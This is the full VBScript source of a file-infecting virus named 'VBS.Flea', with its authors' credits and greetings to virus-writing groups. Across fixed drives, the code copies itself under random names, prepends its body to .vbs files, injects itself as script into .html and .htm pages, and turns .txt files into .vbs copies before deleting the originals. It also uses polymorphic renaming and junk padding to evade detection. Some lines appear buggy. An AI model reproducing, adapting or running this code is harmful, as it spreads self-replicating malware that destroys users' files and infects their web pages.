'VBS.Flea / We l0ve the c4ts & d0gs
'by j0nathanK0h, j3r3my0Ng, k3lvink0ng, Jinji3
'Dedicated to my brother (j3ffr3y),  29A,  Matrix, CoderzNet
'babycatfish@hotmail.com 


For TICKS = 1 to 3
	Randomize: On Error Resume Next
	Set SOULS = CreateObject("Scripting.FileSystemObject")
	Set SLICE = SOULS.GetFolder(".")
	HMBOY = Wscript.ScriptFullName
	
	SEXBOY = Chr(Int(Rnd * 25) + 65)
	For LOBOY = 1 to Int(Rnd * 4)
		SEXBOY = SEXBOY & Chr(Int(Rnd * 25) + 65)
	Next
	
	Set FLEAS = SOULS.OpenTextFile(HMBOY,1)
	Set LOUSE = SOULS.CreateTextFile (SLICE & Chr(92) & SEXBOY & Chr(46) & Chr(118) & Chr(98) & Chr(115), True)
	
	For MISTY = 1 to Int(Rnd * 30) + 10
		LOUSE.WriteLine DIGIT(GHOST)
	Next
	
	Do Until InStr(1,SPITS,Chr(39) & Chr(101) & Chr(110) & Chr(100))
		SPITS = POTTY(FLEAS.ReadLine)
		LOUSE.WriteLine SPITS & DIGIT(GHOST)
	Loop
	FLEAS.Close

	For MISTY = 1 to Int(Rnd * 30) + 10
		LOUSE.WriteLine DIGIT(GHOST)
	Next	
	LOUSE.Close
Next

Dim SEXYBOY
Dim SEXYGAL

Sub SEXYBOY()
Randomize: On Error Resume Next
Set SOULS = CreateObject("Scripting.FileSystemObject")
Set SLICE = SOULS.GetFolder(".")
HMBOY = Wscript.ScriptFullName

For Each MONEY in SOULS.Drives
	If MONEY.DriveType = 2 Then
		Set SPIRIT = SOULS.GetFolder(MONEY & "\")
		For Each PERSON In SPIRIT.SubFolders
			For Each SEXGOD In PERSON.Files
				If USUCK(SOULS.GetExtensionName(SEXGOD.Name)) = Chr(86) & Chr(66) & Chr(83) Then
					Set MUSHY = SOULS.OpenTextFile(SEXGOD, 1)
					HUSHY = MUSHY.ReadAll
					MUSHY.Close
					If InStr(1, HUSHY, Chr(39) & Chr(101) & Chr(110) & Chr(100)) = 0 And InStr(1, HUSHY, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) = 0 Then
						Set DEATH=SOULS.OpenTextFile(HMBOY,1)
						SEXYME = 0
						Do Until InStr(1, CYBER, Chr(39) & Chr(101) & Chr(110) & Chr(100))
							CYBER = DIGIT(DEATH.ReadLine)
							If InStr(1, CYBER, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) Then SEXYME = 1
							If SEXYME = 1 Then TAIL = TAIL & vbcrlf & CYBER
						Loop
						DEATH.Close

						Set MUSHY = SOULS.OpenTextFile(SEXGOD, 2)
						MUSHY.WriteLine POTTY(TAIL)
						MUSHY.WriteLine HUSHY	
						MUSHY.Close

						For CATS = 1 to Int(Rnd * 30) + 10
							MUSHY.WriteLine DIGIT(TIGER)
						Next
						MUSHY.Close
					End If
				Else
					If USUCK(SOULS.GetExtensionName(SEXGOD.Name)) = Chr(72) & Chr(84) & Chr(77) & Chr(76) Or USUCK(SOULS.GetExtensionName(SEXGOD.Name)) = Chr(72) & Chr(84) & Chr(77) Then
						Set DEATH=SOULS.OpenTextFile(HMBOY,1)
						SEXYME = 0
						Do Until InStr(1, CYBER, Chr(39) & Chr(101) & Chr(110) & Chr(100))
							CYBER = DEATH.ReadLine
							If InStr(1, CYBER, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) Then SEXYME = 1
							If SEXYME = 1 Then TAIL = TAIL & vbcrlf & CYBER
						Loop
						DEATH.Close

						Set MUSHY = SOULS.OpenTextFile(SEXGOD, 2)
						MUSHY.WriteLine "<SCRIPT LANGUAGE = ""VBScript""> & VbCrLf & "<!--" & VbCrLf & POTTY(TAIL) & VbCrLf & "-->" & VbCrLf & "</SCRIPT>"
						MUSHY.WriteLine HUSHY	
						MUSHY.Close

						For CATS = 1 to Int(Rnd * 30) + 10
							MUSHY.WriteLine DIGIT(TIGER)
						Next
						MUSHY.Close
					End If
				End If
			Next
		Next
	End If
Next
End Sub

Sub SEXYGAL()
Randomize: On Error Resume Next
Set SOULS = CreateObject("Scripting.FileSystemObject")
Set SLICE = SOULS.GetFolder(".")
HMBOY = Wscript.ScriptFullName

For Each MONEY In SOULS.Drives
	If MONEY.DriveType = 2 Then
		Set LIONS = SOULS.GetFolder(MONEY & "\")
		For Each LIONS In SOULS.GetFolder(TIGER).SubFolders
			Set ASS = LIONS.Files
			For Each MUSHY In ASS
				If USUCK(SOULS.GetExtensionName(MUSHY.Name)) = Chr(84) & Chr(88) & Chr(84) Then
					Set SEXYKID = SOULS.GetFile(MUSHY.Path)
					SEXYKID.Copy(MUSHY.Path & ".vBs")
					SEXYKID.Delete
				End If
			Next
		Next
	End If
Next
End Sub

Function POTTY(SAVER)
Dim GERMS(25), SPOTS(25): On Error Resume Next: Randomize
GERMS(1) = "SAVER": GERMS(2) = "POTTY": GERMS(3) = "GERMS": GERMS(4) = "ROVER"
GERMS(5) = "SOULS": GERMS(6) ="GHOST": GERMS(7) = "SPITS": GERMS(8) = "SONGS"
GERMS(9) = "TICKS": GERMS(10) = "MISTY": GERMS(11) = "LOBOY": GERMS(12) = "FLEAS"
GERMS(13) = "HMBOY": GERMS(14) = "SLICE": GERMS(15) = "LOUSE": GERMS(16) = "KONGS"
GERMS(17) = "TIGER": GERMS(18) = "HUSHY": GERMS(19) = "MUSHY": GERMS(20) = "DEATH"
GERMS(21) = "SPOTS": GERMS(22) = "SEXYBOY": GERMS(23) = "SEXYGAL": GERMS(24) = "DIGIT"
GERMS(25) = "MONEY"

For TICKS = 1 to 25
	For ROVER = 1 to Int(Rnd * 3) + 4
		SPOTS(TICKS) = SPOTS(TICKS) & Chr(Int(Rnd * 25) + 65)
	Next
Next

For ROVER = 1 To 25
    While InStr(1, SAVER, GERMS(ROVER), vbTextCompare)
    SEXYBOY = InStr(1, SAVER, GERMS(ROVER), vbTextCompare)
        SAVER = Mid(SAVER, 1, SEXYBOY) & SPOTS(ROVER) & Mid(SAVER, SEXYBOY + Len(SPOTS(ROVER)) - 1)
    Wend
Next
POTTY = SAVER
End Function

Function DIGIT(DIGIT_DIGIT)
DIGIT_SEXLUV = ""
For ROVER = 1 To Int(Rnd * 30) + 1
	For ROVER_ROVER = 1 To Int(Rnd * 50) + 1
		DIGIT_SEXLUV = DIGIT_SEXLUV & Chr(Int(Rnd * 235) + 20)
	Next
Next
DIGIT = DIGIT_DIGIT & "'" & DIGIT_SEXLUV
If Len(DIGIT) >= 900 Then DIGIT = Mid(DIGIT, 1, 500)
End Function
